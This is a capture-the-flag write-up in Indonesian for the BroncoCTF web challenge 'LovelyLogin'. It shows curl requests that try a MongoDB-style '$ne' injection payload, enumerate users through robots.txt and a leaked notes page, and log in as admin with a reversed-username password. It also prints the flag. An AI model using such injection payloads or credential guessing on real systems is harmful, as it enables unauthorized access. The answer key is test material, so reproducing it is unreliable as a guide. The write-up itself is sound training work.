;;;;;;;;;;;# LovelyLogin — BroncoCTF Web Writeup

**Kategori:** Web
**Challenge:** LovelyLogin
**Flag:** `bronco{R3v3rs1ng_1s_S3cure}`

## Deskripsi Challenge

> Welcome to our lovely new login page 💕. The developers swear it's secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user? P.S. please follow my wishes and do not scrape it...

Target: `https://broncoctf-lovely-login.chals.io/`

## Recon Awal

Halaman utama menampilkan form login sederhana (username + password) yang mengirim request `POST /login` berisi JSON:

```json
{"username": "...", "password": "..."}
```

Response dari server memberi pesan berbeda tergantung kondisi:
- Username tidak ditemukan → `No such user`
- Username ditemukan, password salah → `Wrong password`
- Login sukses → halaman HTML berisi flag

Perbedaan pesan error ini (**user enumeration via error message**) jadi petunjuk pertama bahwa validasi username dan password dilakukan terpisah.

## Percobaan NoSQL Injection

Karena aplikasi menggunakan Express (`X-Powered-By: Express`) dan responsnya mengindikasikan pengecekan berbasis dokumen (mirip MongoDB), dicoba NoSQL injection klasik:

```bash
curl -s -X POST https://broncoctf-lovely-login.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

Hasil: `No such user` — artinya field `username` tidak vulnerable terhadap operator MongoDB (kemungkinan di-cast paksa ke string atau di-strict-compare).

Percobaan lanjutan dengan `$ne`, `$gt`, `$regex` pada field `password` (dengan `username: admin`) semua tetap menghasilkan `Wrong password`. Kesimpulan: **NoSQL injection tidak berhasil** — aplikasi kemungkinan melakukan sanitasi/tipe-checking input sebelum query.

## Menemukan Informasi Bocor

### 1. `robots.txt`

```bash
curl -s https://broncoctf-lovely-login.chals.io/robots.txt
```

```
User-agent: *
Disallow: /security
# amVmZixzYXJhaCxhZG1pbixndWVzdA==
```

Meskipun challenge meminta untuk *"tidak melakukan scraping"*, mengecek `robots.txt` secara manual (bukan automated scraping/crawling) adalah langkah recon standar. String base64 di komentar ternyata berisi daftar username:

```bash
echo "amVmZixzYXJhaCxhZG1pbixndWVzdA==" | base64 -d
# jeff,sarah,admin,guest
```

### 2. Endpoint `/security` (yang justru "di-disallow")

Endpoint yang di-disallow di `robots.txt` biasanya sengaja disembunyikan dari crawler tapi tetap bisa diakses langsung:

```bash
curl -s -i https://broncoctf-lovely-login.chals.io/security
```

Isi halaman:

```
Internal Security Notes
Status: Work in progress
- Passwords are derived from usernames
- Current implementation stores them backwards for obfuscation
- Planned upgrade: hashing + salting
TODO: remove this page before production deployment!
```

Ini adalah kunci utama solusi: **password = username yang dibalik (reversed string)**, bukan hash sama sekali.

## Eksploitasi

Untuk user `admin`, password adalah `admin` dibalik → `nimda`.

```bash
curl -s -X POST https://broncoctf-lovely-login.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"nimda"}'
```

Response:

```html
<h2>Welcome, admin.</h2>
<img src="https://media.giphy.com/..." style="max-width:300px;"><br>
<pre>bronco{R3v3rs1ng_1s_S3cure}</pre>
```

**Flag: `bronco{R3v3rs1ng_1s_S3cure}`**
